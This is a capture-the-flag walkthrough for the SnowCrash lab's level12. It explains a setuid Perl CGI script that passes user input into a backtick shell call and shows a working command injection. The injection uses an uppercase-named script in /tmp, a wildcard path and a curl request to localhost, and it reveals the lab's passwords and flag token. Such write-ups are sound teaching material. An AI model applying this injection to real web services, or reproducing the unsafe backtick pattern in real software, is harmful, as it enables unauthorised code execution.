# Level12

## How to login

```bash
ssh level12@192.168.1.184 -p 4242
password: fa6v5ateaw21peobuub8ipe6s
```

## How to get the flag

Once logged, we find a file called 'level12.pl' in the home holder that seems to be a Perl script that uses the CGI (Common Gateway Interface) module to handle web requests. As previous exercises, the binary has the Setuid bit set, meaning that it will be executed with the privileges of the file owner even when run by another user, which can lead to security risk and potential exploitation.
```bash
level12@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
level12@SnowCrash:~$ cat level12.pl
```
```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```

The code analysis show us that the script is listening on localhost:4646 and takes two parameters, x and y, from a web request. It transforms x to uppercase and removes whitespace and trailing characters, then runs egrep "^$x" /tmp/xd to search for lines in /tmp/xd starting with the processed x. It checks if any matching line contains y after a : and returns 1 for a match or 0 for no match, printing .. for a match or . for no match.

In this scenario, command injection is not directly possible because the input ($xx) is sanitized by converting it to uppercase and removing whitespace and trailing characters, which eliminates most shell metacharacters. For example, if we try to inject a command like 'getflag', it would be transformed into 'GETFLAG', which would not be valid for execution.

We have to find another strategy to inject and execute code through "^$xx". So, after some thought, we find another way consisting in the creation of a script that will be executed through "^$xx" as shown below.
```
level12@SnowCrash:~$ echo 'getflag > /tmp/flag' > /tmp/EXPLOIT
level12@SnowCrash:~$ chmod +x /tmp/EXPLOIT
```

Once the bash script has been created, we use the command 'curl' together with the info obtained previously about the address and port. It's important to add backticks to the script in order to be executed and to add the wildcard '*' to match any directory, so the exploit can be found. We are successful and the flag is found.
```
level12@SnowCrash:~$ curl localhost:4646/?x='`/*/EXPLOIT`'
..level12@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```

The key point is that the exploit bypasses the script’s intended behavior (searching /tmp/xd) and instead executes a completely different command (/*/EXPLOIT). This is achieved by injecting a command with backticks and using a wildcard to locate the exploit script. The exploit also works because the script’s sanitization does not remove backticks or wildcards, allowing the attacker to execute arbitrary commands indirectly.
